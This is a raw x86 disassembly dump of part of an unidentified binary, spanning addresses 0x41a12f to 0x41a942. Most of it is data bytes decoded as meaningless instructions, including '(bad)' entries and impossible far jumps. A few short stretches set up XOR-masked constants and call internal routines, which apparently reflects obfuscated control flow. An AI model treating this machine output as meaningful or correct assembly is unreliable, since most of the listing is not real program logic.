  41a12f:	and    BYTE PTR [ebx+0xf],cl
  41a132:	out    0x6c,al
  41a134:	or     esp,DWORD PTR [ecx]
  41a136:	fs pop ebp
  41a138:	dec    edx
  41a139:	(bad)  
  41a13a:	aam    0x46
  41a13c:	scas   al,BYTE PTR es:[edi]
  41a13d:	loop   0x41a0f1
  41a13f:	push   ebp
  41a140:	mov    edi,0x8f294340
  41a145:	cs mov eax,0x69a43099
  41a14b:	outs   dx,BYTE PTR ds:[esi]
  41a14c:	mov    ah,BYTE PTR [edi+eiz*8-0x18]
  41a150:	push   ss
  41a151:	gs mov bh,0x98
  41a154:	test   DWORD PTR [eax+ebx*2],ebx
  41a157:	repnz sar bh,0xda
  41a15b:	aaa    
  41a15c:	xchg   esi,eax
  41a15d:	test   al,0x5
  41a15f:	or     DWORD PTR [edx+0x6b],esi
  41a162:	inc    ecx
  41a163:	out    0xe6,al
  41a165:	in     eax,dx
  41a166:	xor    edi,edi
  41a168:	mov    edx,0x59031c88
  41a16d:	es sbb al,0xd3
  41a170:	and    ecx,0x23
  41a173:	rcl    BYTE PTR [eax],1
  41a175:	aaa    
  41a176:	mov    ds:0xf252b354,al
  41a17b:	(bad)  
  41a17c:	ficom  WORD PTR ds:0x35c4d458
  41a182:	xor    al,0x11
  41a184:	in     eax,0xc1
  41a186:	fmul   QWORD PTR ds:0x27dde4b4
  41a18c:	fldcw  WORD PTR [ecx-0x6c0ca8bf]
  41a192:	mov    ch,0x65
  41a194:	cli    
  41a195:	pop    esp
  41a196:	les    ecx,FWORD PTR [ecx]
  41a198:	test   al,0xcb
  41a19a:	sbb    cl,BYTE PTR [esi]
  41a19c:	push   eax
  41a19d:	int3   
  41a19e:	inc    esi
  41a19f:	ja     0x41a184
  41a1a1:	mov    eax,0x89c8e7d5
  41a1a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1a7:	imul   DWORD PTR [edi+0x61]
  41a1aa:	test   DWORD PTR [ebx-0x26],ebp
  41a1ad:	sbb    esi,DWORD PTR [ebp-0x6ba94b19]
  41a1b3:	xor    eax,0x73711ba0
  41a1b8:	outs   dx,DWORD PTR ds:[esi]
  41a1b9:	mov    dh,0xf2
  41a1bb:	rdtsc  
  41a1bd:	mov    ch,0x9e
  41a1bf:	mov    eax,esp
  41a1c1:	aas    
  41a1c2:	add    al,0x2c
  41a1c4:	fdivr  QWORD PTR [edx-0x53d8ebf6]
  41a1ca:	pushf  
  41a1cb:	cmp    BYTE PTR [edx-0x621c5062],cl
  41a1d1:	pop    edx
  41a1d2:	and    DWORD PTR [edx+0xb],ebp
  41a1d5:	pop    esi
  41a1d6:	push   ecx
  41a1d7:	in     eax,dx
  41a1d8:	sti    
  41a1d9:	jae    0x41a238
  41a1db:	shr    DWORD PTR [ecx-0x7e],cl
  41a1de:	mov    al,0x11
  41a1e0:	(bad)
  41a1e4:	push   ss
  41a1e5:	add    ebx,DWORD PTR [ebp-0x36]
  41a1e8:	or     BYTE PTR [esi-0x3086b73c],bh
  41a1ee:	inc    ebx
  41a1ef:	shr    DWORD PTR [eax-0x533e8809],0x78
  41a1f6:	outs   dx,DWORD PTR ds:[esi]
  41a1f7:	jb     0x41a1f1
  41a1f9:	mov    bl,0x5d
  41a1fb:	popf   
  41a1fc:	dec    esi
  41a1fd:	in     eax,0x97
  41a1ff:	jns    0x41a1df
  41a201:	xchg   DWORD PTR ds:0x46ecf47,edi
  41a207:	(bad)  
  41a209:	or     eax,0xc0e72501
  41a20e:	mov    WORD PTR [eax],gs
  41a210:	inc    ecx
  41a211:	cmp    eax,DWORD PTR [ecx]
  41a213:	pop    esp
  41a214:	or     DWORD PTR [ecx-0x32bebf83],esi
  41a21a:	shl    BYTE PTR [eax+0x4155262e],cl
  41a220:	and    eax,0x325d
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	lock pop es
  41a2a2:	test   DWORD PTR [ebx+ebp*1-0x53],edi
  41a2a6:	push   ss
  41a2a7:	sbb    BYTE PTR [edx+edx*1-0x5be1e7e8],bh
  41a2ae:	rcr    esi,0x76
  41a2b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b2:	ins    DWORD PTR es:[edi],dx
  41a2b3:	fdiv   QWORD PTR [ebx]
  41a2b5:	xor    eax,0x2480ff87
  41a2ba:	nop
  41a2bb:	or     ebp,DWORD PTR [edi]
  41a2bd:	or     al,0xf6
  41a2bf:	jecxz  0x41a332
  41a2c1:	mov    ebp,ds
  41a2c3:	popa   
  41a2c4:	sbb    DWORD PTR [edx-0x58],esi
  41a2c7:	aam    0x88
  41a2c9:	mov    al,ds:0x2b6ba291
  41a2ce:	jp     0x41a29a
  41a2d0:	jecxz  0x41a25a
  41a2d2:	push   ds
  41a2d3:	inc    edx
  41a2d4:	test   al,0x7
  41a2d6:	call   0xf1a1ff9e
  41a2db:	inc    eax
  41a2dc:	sbb    dl,BYTE PTR [ebp-0x10cc5fb0]
  41a2e2:	aad    0xc1
  41a2e4:	adc    BYTE PTR [edi+0x5469999f],0x96
  41a2eb:	dec    edx
  41a2ec:	aas    
  41a2ed:	dec    edi
  41a2ee:	mul    BYTE PTR [esi+0xcfc8cba]
  41a2f4:	(bad)  
  41a2f5:	out    dx,eax
  41a2f6:	popa   
  41a2f7:	cmp    ecx,DWORD PTR [edx+0x65]
  41a2fa:	into   
  41a2fb:	mov    ebx,0xf13c644a
  41a300:	fcomp  QWORD PTR [esp+ebp*1-0x10]
  41a304:	into   
  41a305:	sub    BYTE PTR [edx-0x4e],ch
  41a308:	cmp    BYTE PTR [ecx],0x4
  41a30b:	mov    bh,0xaa
  41a30d:	dec    edi
  41a30e:	pop    esi
  41a30f:	xchg   ecx,eax
  41a310:	fnstcw WORD PTR [esi]
  41a312:	je     0x41a318
  41a314:	mov    edx,0x6bba8efc
  41a319:	jecxz  0x41a364
  41a31b:	inc    ecx
  41a31c:	lea    edx,[ecx-0x48]
  41a31f:	bswap  ecx
  41a321:	mov    esi,0xadc26f04
  41a326:	in     al,0x9
  41a328:	jae    0x41a2ee
  41a32a:	mov    eax,0x26cf275a
  41a32f:	aad    0x18
  41a331:	push   edi
  41a332:	(bad)  
  41a333:	xchg   esp,eax
  41a334:	sbb    al,0xb8
  41a336:	push   ebx
  41a337:	fsub   DWORD PTR [ebx+eax*8+0x3f]
  41a33b:	xor    eax,0x56aecf58
  41a340:	test   BYTE PTR [ebp-0x67db1ba7],al
  41a346:	cmc    
  41a347:	push   ecx
  41a348:	callw  0x1574
  41a34c:	mov    bl,0x40
  41a34e:	lods   eax,DWORD PTR ds:[esi]
  41a34f:	sahf   
  41a350:	cmp    eax,0x2e8e85fd
  41a355:	jb     0x41a302
  41a357:	push   es
  41a358:	repnz push ds
  41a35a:	imul   DWORD PTR [edx]
  41a35c:	fst    QWORD PTR [ecx+0xd7411a5]
  41a362:	mov    ah,0x1d
  41a364:	es lahf 
  41a366:	outs   dx,DWORD PTR ds:[esi]
  41a367:	xor    eax,0x710ddc70
  41a36c:	add    esp,DWORD PTR [esi]
  41a36e:	mov    eax,0x8c5658fb
  41a373:	repnz or al,0x74
  41a376:	mov    ebp,0xd44e3148
  41a37b:	jmp    0xba75:0x97efbb54
  41a382:	loope  0x41a377
  41a384:	dec    edi
  41a385:	mov    esp,DWORD PTR [eax]
  41a387:	pop    ecx
  41a388:	push   es
  41a389:	push   edi
  41a38a:	mov    ch,dl
  41a38c:	sti    
  41a38d:	scas   eax,DWORD PTR es:[edi]
  41a38e:	shl    BYTE PTR [edi-0x347dc842],cl
  41a394:	mov    fs,edx
  41a396:	jnp    0x41a357
  41a398:	and    eax,0xd24126b7
  41a39d:	ret    0xf371
  41a3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3a1:	rol    ebp,0xc
  41a3a4:	icebp  
  41a3a5:	xchg   ebx,eax
  41a3a6:	xchg   edi,eax
  41a3a7:	(bad)  
  41a3a8:	mov    ds:0xf5faf0a7,eax
  41a3ad:	enter  0xf27d,0xbd
  41a3b1:	jo     0x41a3a0
  41a3b3:	loope  0x41a3bf
  41a3b5:	outs   dx,DWORD PTR ss:[esi]
  41a3b7:	(bad)  
  41a3b8:	jnp    0x41a3ff
  41a3ba:	test   DWORD PTR gs:[ebx+0x5a],ebx
  41a3be:	and    DWORD PTR [edx+0x583f44ae],edx
  41a3c4:	push   esp
  41a3c5:	adc    dl,dl
  41a3c7:	push   ebx
  41a3c8:	mov    esi,0x77c3325
  41a3cd:	bound  ebx,QWORD PTR [esi-0x136400f4]
  41a3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3d4:	dec    esp
  41a3d5:	fdivr  DWORD PTR [edx-0x3a]
  41a3d8:	cmc    
  41a3d9:	mov    ch,0xb
  41a3db:	lahf   
  41a3dc:	out    dx,al
  41a3dd:	arpl   WORD PTR [ebp+0x55addac8],bx
  41a3e3:	cmp    BYTE PTR [ecx],ch
  41a3e5:	pusha  
  41a3e6:	dec    eax
  41a3e7:	stc    
  41a3e8:	sub    eax,0x894e97c2
  41a3ed:	stos   BYTE PTR es:[edi],al
  41a3ee:	push   edx
  41a3ef:	arpl   WORD PTR [ebp+0x9],di
  41a3f2:	jecxz  0x41a3d7
  41a3f4:	mov    ss,WORD PTR [ecx-0x15]
  41a3f7:	mov    bl,0x2d
  41a3f9:	retf   0x6
  41a3fc:	stos   DWORD PTR es:[edi],eax
  41a3fd:	cmp    bl,BYTE PTR [ecx-0x4e32835b]
  41a403:	xlat   BYTE PTR ds:[ebx]
  41a404:	lods   eax,DWORD PTR ds:[esi]
  41a405:	int    0xea
  41a407:	add    al,0x2
  41a409:	les    esi,FWORD PTR [ebx-0x45]
  41a40c:	call   DWORD PTR [ebp+0x416ea15c]
  41a412:	mov    edx,0xd1844bb6
  41a417:	in     eax,dx
  41a418:	xchg   ecx,eax
  41a419:	stos   BYTE PTR es:[edi],al
  41a41a:	jno    0x41a3c3
  41a41c:	xchg   esp,eax
  41a41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a41e:	outs   dx,BYTE PTR ds:[esi]
  41a41f:	popa   
  41a420:	xor    eax,0xd5136e2f
  41a425:	and    dh,BYTE PTR [esi+edi*2+0x10560b0e]
  41a42c:	aam    0xa
  41a42e:	ins    BYTE PTR es:[edi],dx
  41a42f:	fiadd  DWORD PTR [edi]
  41a431:	jl     0x41a45c
  41a433:	sub    BYTE PTR [ecx],dh
  41a435:	push   0x542f197a
  41a43a:	(bad)  
  41a43b:	pop    edx
  41a43c:	inc    eax
  41a43d:	xchg   DWORD PTR [edx+0x22],esp
  41a440:	xor    al,0xe7
  41a442:	test   eax,0x662e953a
  41a447:	ss jb  0x41a487
  41a44a:	push   ebx
  41a44b:	dec    ecx
  41a44c:	cmc    
  41a44d:	call   0xdbd8c100
  41a452:	and    al,0xbb
  41a454:	icebp  
  41a455:	mov    al,0x92
  41a457:	jmp    0x33d:0xfeba0423
  41a45e:	and    DWORD PTR ds:0x13639b4d,eax
  41a464:	jle    0x41a4ab
  41a466:	add    al,0x24
  41a468:	sahf   
  41a469:	and    DWORD PTR [edi],esi
  41a46b:	mov    WORD PTR [esi],?
  41a46d:	out    dx,eax
  41a46e:	fst    QWORD PTR [esi+0x11]
  41a471:	clc    
  41a472:	bound  esp,QWORD PTR [edi-0x6bd072b4]
  41a478:	jp     0x41a4e1
  41a47a:	jecxz  0x41a448
  41a47c:	dec    esp
  41a47d:	mov    cs,WORD PTR [ebx+0xf18f78c]
  41a483:	inc    ebx
  41a484:	mov    bh,0x83
  41a486:	out    0xf7,al
  41a488:	sbb    eax,0x19ea1138
  41a48d:	or     DWORD PTR [edx-0x6e],ebx
  41a490:	jnp    0x41a4d9
  41a492:	and    eax,0xb5107e68
  41a497:	mov    ecx,0x68e234d5
  41a49c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a49d:	ret    0x61e5
  41a4a0:	pop    esi
  41a4a1:	(bad)  
  41a4a2:	or     BYTE PTR [eax+0x7c],bh
  41a4a5:	int3   
  41a4a6:	push   esp
  41a4a7:	jle    0x41a45f
  41a4a9:	stos   DWORD PTR es:[edi],eax
  41a4aa:	jne    0x41a496
  41a4ac:	mov    eax,ds:0xddf072e8
  41a4b1:	or     eax,0x397cd148
  41a4b6:	lock scas al,BYTE PTR es:[edi]
  41a4b8:	lahf   
  41a4b9:	or     BYTE PTR [eax+0x7b],dh
  41a4bc:	mov    DWORD PTR [ebp+0x6d],esi
  41a4bf:	push   ebx
  41a4c0:	push   edi
  41a4c1:	inc    esp
  41a4c2:	inc    esp
  41a4c3:	lahf   
  41a4c4:	xchg   edi,eax
  41a4c5:	push   ebx
  41a4c6:	ror    bl,1
  41a4c8:	mov    eax,0x96a9ca95
  41a4cd:	xchg   BYTE PTR [ebx],bh
  41a4cf:	addr16 pop edi
  41a4d1:	pop    ebp
  41a4d2:	fldenv [ecx-0x79cb189e]
  41a4d8:	fs push esi
  41a4da:	int    0x2a
  41a4dc:	or     edi,DWORD PTR [edx]
  41a4de:	mov    ah,0x33
  41a4e0:	inc    edi
  41a4e1:	in     eax,dx
  41a4e2:	lahf   
  41a4e3:	sti    
  41a4e4:	or     BYTE PTR [ecx-0x65],dl
  41a4e7:	sub    BYTE PTR [ebx+0x5ea5240b],ch
  41a4ed:	pop    ss
  41a4ee:	imul   edx,DWORD PTR ds:0xa9e4d886,0x80d68fe
  41a4f8:	inc    esi
  41a4f9:	jb     0x41a4ae
  41a4fb:	out    dx,al
  41a4fc:	jne    0x41a54f
  41a4fe:	or     DWORD PTR [edx-0x558427ed],esi
  41a504:	mov    WORD PTR [esi],cs
  41a506:	xchg   ebx,eax
  41a507:	xchg   edx,eax
  41a508:	mov    ds:0xec8f17cf,al
  41a50d:	(bad)  
  41a50f:	popa   
  41a510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a511:	fcomp  DWORD PTR [edi+0xeb64f93]
  41a517:	xlat   BYTE PTR ds:[ebx]
  41a518:	dec    ebp
  41a519:	jb     0x41a4e7
  41a51b:	sub    ch,al
  41a51d:	aas    
  41a51e:	fsub   QWORD PTR [edi]
  41a520:	(bad)  
  41a521:	fidivr DWORD PTR [edx-0x6c7a6871]
  41a527:	mov    ebx,0x30093b96
  41a52c:	cmp    DWORD PTR [edi-0x239e60bd],ebp
  41a532:	xchg   esp,eax
  41a533:	mov    ebx,0x61160561
  41a538:	popf   
  41a539:	icebp  
  41a53a:	shl    BYTE PTR [ebx],0xb3
  41a53d:	dec    ecx
  41a53e:	jno    0x41a591
  41a540:	jmp    0x41a54d
  41a542:	pushf  
  41a543:	mov    bh,0xbf
  41a545:	pusha  
  41a546:	mov    ebx,0x78986583
  41a54b:	dec    ebp
  41a54c:	(bad)  
  41a54d:	fmul   DWORD PTR [eax+0x650e4448]
  41a553:	push   0x96116769
  41a558:	mov    ds:0x79ccd79d,eax
  41a55d:	shl    edx,0x98
  41a560:	aam    0x1c
  41a562:	push   ebx
  41a563:	pop    esi
  41a564:	adc    DWORD PTR [esi-0x6b348cf7],esi
  41a56a:	adc    esi,edx
  41a56c:	and    ah,BYTE PTR ds:0x9bd4d9e6
  41a572:	adc    eax,0x52677348
  41a577:	shl    DWORD PTR [ebp-0x351af140],cl
  41a57d:	mov    ah,0xe9
  41a57f:	mov    dh,0x72
  41a581:	aas    
  41a582:	sbb    ch,BYTE PTR [ecx+0x68]
  41a585:	lahf   
  41a586:	mov    dl,0x35
  41a588:	cmp    BYTE PTR [ecx+0x2e],bl
  41a58b:	adc    edx,DWORD PTR [esi]
  41a58d:	xchg   esi,eax
  41a58e:	xor    bl,dh
  41a590:	inc    ecx
  41a591:	sub    eax,0x8a9084fc
  41a596:	or     ebx,DWORD PTR [ebx+0x7241e75e]
  41a59c:	push   ebp
  41a59d:	mov    bl,0x75
  41a59f:	and    eax,0xc430416a
  41a5a4:	sub    BYTE PTR [ecx+0x69],dh
  41a5a7:	xor    esi,ecx
  41a5a9:	sub    ecx,DWORD PTR [ecx+0xd]
  41a5ac:	cmp    dl,BYTE PTR [ebx+0x119298e7]
  41a5b2:	jno    0x41a567
  41a5b4:	fnstsw WORD PTR [ebp-0x45630265]
  41a5ba:	jns    0x41a5dc
  41a5bc:	les    ecx,FWORD PTR [edx]
  41a5be:	in     al,dx
  41a5bf:	lods   al,BYTE PTR ds:[esi]
  41a5c0:	adc    al,0x26
  41a5c2:	fidivr DWORD PTR [eax-0x6cd4d1f2]
  41a5c8:	fst    st(1)
  41a5ca:	inc    ebx
  41a5cb:	gs out 0x86,al
  41a5ce:	lahf   
  41a5cf:	ins    DWORD PTR es:[edi],dx
  41a5d0:	sbb    eax,0x728c5c97
  41a5d5:	cmp    ebp,DWORD PTR [esi-0x386b84e9]
  41a5db:	daa    
  41a5dc:	int    0x9
  41a5de:	fwait
  41a5df:	sub    BYTE PTR [ebp+0x7ff3f522],ch
  41a5e5:	lods   eax,DWORD PTR ds:[esi]
  41a5e6:	adc    eax,edi
  41a5e8:	jecxz  0x41a5e6
  41a5ea:	aaa    
  41a5eb:	sar    ebp,cl
  41a5ed:	fistp  DWORD PTR gs:[esi-0x1e804793]
  41a5f4:	pop    edx
  41a5f5:	inc    di
  41a5f7:	fsubr  st,st(4)
  41a5f9:	sbb    bl,BYTE PTR [ebx]
  41a5fb:	fidiv  DWORD PTR [edx-0x1caf61ed]
  41a601:	mov    esi,DWORD PTR ds:[si-0x7340]
  41a607:	xor    dh,BYTE PTR [edi]
  41a609:	cmc    
  41a60a:	out    0xc0,al
  41a60c:	inc    esp
  41a60d:	sbb    DWORD PTR [eax+0x646828e6],ecx
  41a613:	or     BYTE PTR [esp+edi*8+0x35a986a4],dl
  41a61a:	push   esp
  41a61b:	add    eax,0xf1e5cf53
  41a620:	mov    al,ds:0xf8cd40ef
  41a625:	loope  0x41a6a0
  41a627:	lods   eax,DWORD PTR ds:[esi]
  41a628:	dec    ebx
  41a629:	jmp    DWORD PTR [ebx+0xcf3cdff]
  41a62f:	loope  0x41a5e3
  41a631:	fs lahf 
  41a633:	push   es
  41a634:	pop    eax
  41a635:	mov    eax,0xa1c5c2a9
  41a63a:	xor    ebx,DWORD PTR [esp+edi*8+0x6799f5bd]
  41a641:	xchg   ecx,eax
  41a642:	inc    ebp
  41a643:	not    BYTE PTR [esi+0x13487b69]
  41a649:	ffree  st(0)
  41a64b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a64c:	aas    
  41a64d:	cli    
  41a64e:	je     0x41a665
  41a650:	iret   
  41a651:	(bad)  
  41a652:	imul   esp,DWORD PTR [edx+0x0],0xa8b5047c
  41a659:	pop    es
  41a65a:	jle    0x41a5fc
  41a65c:	mov    esp,0x8bc12b7e
  41a661:	dec    esp
  41a662:	and    al,0x50
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x42202c
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	loop   0x41a6e3
  41a74a:	out    dx,al
  41a74b:	mov    esi,0x1816a5cf
  41a750:	mov    esp,0x98181812
  41a755:	loopne 0x41a7ca
  41a757:	clc    
  41a758:	mov    ah,0x24
  41a75a:	outs   dx,BYTE PTR ds:[esi]
  41a75b:	cli    
  41a75c:	add    dh,al
  41a75e:	sub    eax,DWORD PTR [edx-0x57]
  41a761:	xchg   al,dl
  41a763:	in     al,dx
  41a764:	and    eax,0x398930b9
  41a769:	data16 xchg BYTE PTR [edx+0x10],bh
  41a76d:	repz jnp 0x41a713
  41a770:	std    
  41a771:	push   cs
  41a772:	push   ecx
  41a773:	adc    DWORD PTR [ecx-0x2a],esi
  41a776:	mov    fs,ecx
  41a778:	adc    esi,DWORD PTR ds:0x88ae7569
  41a77e:	rcr    ch,0x2c
  41a781:	or     al,0x30
  41a783:	mov    bh,0x46
  41a785:	std    
  41a786:	pop    ds
  41a787:	adc    BYTE PTR [edi-0x36c0f844],cl
  41a78d:	ret    0xd19a
  41a790:	lods   al,BYTE PTR ds:[esi]
  41a791:	jl     0x41a7ac
  41a793:	mov    bh,0x72
  41a795:	lods   al,BYTE PTR ds:[esi]
  41a796:	push   es
  41a797:	push   esi
  41a798:	rol    DWORD PTR [ecx+eax*8-0x346cd8ea],0x27
  41a7a0:	js     0x41a7b0
  41a7a2:	jne    0x41a7dd
  41a7a4:	sbb    al,0xd9
  41a7a6:	sub    eax,0xa931be6b
  41a7ab:	jmp    0x41a767
  41a7ad:	lea    edi,ss:[edx+0x5ee4f35d]
  41a7b4:	inc    edx
  41a7b5:	scas   eax,DWORD PTR es:[edi]
  41a7b6:	xchg   BYTE PTR [ecx+0x44],cl
  41a7b9:	sub    cl,BYTE PTR [edx+esi*2+0x6]
  41a7bd:	add    eax,0xedeede7a
  41a7c2:	cs je  0x41a83b
  41a7c5:	ficom  DWORD PTR [edx-0x377262c1]
  41a7cb:	arpl   WORD PTR [esi],ax
  41a7cd:	jnp    0x41a7c2
  41a7cf:	popa   
  41a7d0:	mov    ds:0xd4ab6e21,al
  41a7d5:	mov    ds:0x783ce674,eax
  41a7da:	xor    al,0x24
  41a7dc:	fcmove st,st(4)
  41a7de:	mov    ah,0x1f
  41a7e0:	dec    edx
  41a7e1:	xlat   BYTE PTR ds:[ebx]
  41a7e2:	jo     0x41a796
  41a7e4:	nop
  41a7e5:	stc    
  41a7e6:	imul   ebx,DWORD PTR [ecx+0x7889b8f],0x274a09a6
  41a7f0:	je     0x41a821
  41a7f2:	lds    esi,FWORD PTR [edi+0x22459100]
  41a7f8:	clc    
  41a7f9:	dec    edx
  41a7fa:	bound  esi,QWORD PTR [eax-0x39821d37]
  41a800:	ret    
  41a801:	test   al,0x94
  41a803:	or     al,0xbc
  41a805:	iret   
  41a806:	mov    eax,ds:0x13c70754
  41a80b:	fisttp DWORD PTR [edi+eiz*8+0x2b]
  41a80f:	add    dh,BYTE PTR [eax]
  41a811:	push   es
  41a812:	fdiv   DWORD PTR [edi]
  41a814:	mov    ds:0x73fbdf35,eax
  41a819:	outs   dx,DWORD PTR ds:[esi]
  41a81a:	mov    ah,BYTE PTR [edi-0x5f]
  41a81d:	xor    al,0xbb
  41a81f:	xlat   BYTE PTR ds:[ebx]
  41a820:	loopne 0x41a7ab
  41a822:	and    BYTE PTR [edx+0xf],ah
  41a825:	xor    al,0xc0
  41a827:	test   DWORD PTR [ebx],0xcacd326b
  41a82d:	mov    ah,0xd8
  41a82f:	and    BYTE PTR [ebx],ah
  41a831:	mov    bh,0xa7
  41a833:	fucomi st,st(1)
  41a835:	jb     0x41a84c
  41a837:	dec    edi
  41a838:	add    al,BYTE PTR [esi]
  41a83a:	push   es
  41a83b:	test   DWORD PTR [eax-0x3a],ecx
  41a83e:	mov    eax,0x3ef3b1a7
  41a843:	lock and ch,0x8e
  41a847:	lea    ebx,[edx*1-0x71b55c19]
  41a84e:	outs   dx,BYTE PTR ds:[esi]
  41a84f:	imul   esp,DWORD PTR [edi],0xc0ce6860
  41a855:	jp     0x41a7ee
  41a857:	ins    DWORD PTR es:[edi],dx
  41a858:	xor    al,0xa2
  41a85a:	repz lea ebx,[ebp+ebp*4+0x1fad76f9]
  41a862:	dec    edi
  41a863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a864:	sbb    BYTE PTR [edi-0x25],0xca
  41a868:	mov    edi,0xac0bab17
  41a86d:	add    BYTE PTR [ebx*1-0xde2e741],0xf6
  41a875:	arpl   WORD PTR [ebp+edx*4+0x24],si
  41a879:	je     0x41a8cb
  41a87b:	std    
  41a87c:	sub    cl,BYTE PTR [edx+esi*1-0x4f84a34a]
  41a883:	jecxz  0x41a83e
  41a885:	loope  0x41a84b
  41a887:	dec    ebx
  41a888:	fcmovu st,st(7)
  41a88a:	pop    edx
  41a88b:	adc    al,0xb2
  41a88d:	enter  0xdc0,0x0
  41a891:	fwait
  41a892:	push   ebx
  41a893:	out    0x8d,eax
  41a895:	data16 jb 0x41a8fd
  41a898:	neg    DWORD PTR [ecx]
  41a89a:	loopne 0x41a8a6
  41a89c:	mov    ds:0xe7a52a57,al
  41a8a1:	inc    ecx
  41a8a2:	push   es
  41a8a3:	retf   
  41a8a4:	jne    0x41a8c6
  41a8a6:	into   
  41a8a7:	(bad)  
  41a8a8:	add    BYTE PTR [ebx-0x67],dh
  41a8ab:	mov    ebx,0xef7e8a2a
  41a8b0:	test   eax,edi
  41a8b2:	ja     0x41a8de
  41a8b4:	pop    esp
  41a8b5:	mov    ecx,0x86e4d0b3
  41a8ba:	add    bl,BYTE PTR [edi+0x3d]
  41a8bd:	mov    ds:0x4727910f,eax
  41a8c2:	enter  0x5c8,0x59
  41a8c6:	aam    0x66
  41a8c8:	inc    esp
  41a8c9:	loop   0x41a933
  41a8cb:	jge    0x41a8d3
  41a8cd:	xchg   ebp,ebp
  41a8cf:	pop    ss
  41a8d0:	fs jb  0x41a906
  41a8d3:	pop    ebp
  41a8d4:	xor    BYTE PTR [esi+0x1c],bl
  41a8d7:	and    al,0xc7
  41a8d9:	(bad)  
  41a8da:	or     eax,0xcd23f06
  41a8df:	out    0x8e,al
  41a8e1:	or     bh,BYTE PTR [eax-0x14]
  41a8e4:	sbb    ecx,DWORD PTR [eax]
  41a8e6:	inc    esi
  41a8e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8e8:	clc    
  41a8e9:	adc    BYTE PTR [eax+eiz*1-0x52287877],bh
  41a8f0:	test   BYTE PTR [ebp+0x3f97f40a],bl
  41a8f6:	and    al,0xf1
  41a8f8:	adc    cl,BYTE PTR [ecx+0x6b]
  41a8fb:	js     0x41a8f2
  41a8fd:	mov    WORD PTR gs:[edx],cs
  41a900:	sub    dl,cl
  41a902:	pop    ebx
  41a903:	xchg   edi,eax
  41a904:	jl     0x41a949
  41a906:	aas    
  41a907:	clc    
  41a908:	jmp    0x2148:0x6457d8a7
  41a90f:	push   ss
  41a910:	jb     0x41a8f9
  41a912:	stos   BYTE PTR es:[edi],al
  41a913:	mov    edi,0x750b2735
  41a918:	sti    
  41a919:	inc    ebp
  41a91a:	dec    edx
  41a91b:	mov    ebx,0x4b38f2b4
  41a920:	add    eax,0x14bc2d5f
  41a925:	add    eax,0xaf722270
  41a92a:	mov    ch,0xaf
  41a92c:	push   ds
  41a92d:	sar    al,1
  41a92f:	imul   edx,DWORD PTR [eax-0x42],0x6ae98944
  41a936:	sar    DWORD PTR [esi+0x2a2c29d],0xc0
  41a93d:	repz sub ch,ch
  41a940:	xor    ah,BYTE PTR [ebx]
  41a942:	xchg   DWORD PTR [eax-0x5b44df32],edx
